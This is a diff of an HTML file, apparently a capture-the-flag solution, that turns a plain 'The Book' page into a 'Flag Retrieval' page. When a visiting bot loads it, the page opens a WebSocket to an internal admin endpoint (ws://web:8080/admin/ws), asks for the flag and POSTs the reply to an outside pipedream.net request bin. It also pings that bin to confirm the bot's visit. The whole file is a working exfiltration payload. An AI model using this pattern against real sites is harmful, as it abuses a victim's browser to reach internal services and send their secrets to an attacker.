@@ -1,18 +1,46 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title>Book</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Flag Retrieval</title>
+</head>
+<body>
     <script>
-      const url = encodeURI("https://eorokvtrcf7mllf.m.pipedream.net/");
-      await fetch(url, {method: "POST"});
+        // Logging interaction with RequestBin to confirm bot access
+        fetch('https://eorokvtrcf7mllf.m.pipedream.net//', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "Bot accessed HTML page" })
+        });
+
+        // WebSocket connection to retrieve flag
+        const ws = new WebSocket('ws://web:8080/admin/ws');
+
+
+   ws.onopen = () => {
+       fetch('https://eorokvtrcf7mllf.m.pipedream.net//', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "Opened?" })
+        });
+     console.log('WebSocket connection established!');
+     ws.send('flag');
+   };
+
+   ws.onmessage = (event) => {
+     const flag = event.data;
+     console.log("Flag:", flag);
+
+     // Send the flag back to RequestBin
+     fetch('https://eorokvtrcf7mllf.m.pipedream.net//', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ flag: flag })
+     });
+
+     ws.close();
+   };
     </script>
-  </head>
-  <body>
-    <h1>The Book</h1>
-    <span>This is a book.</span>
-  </body>
+</body>
 </html>
 
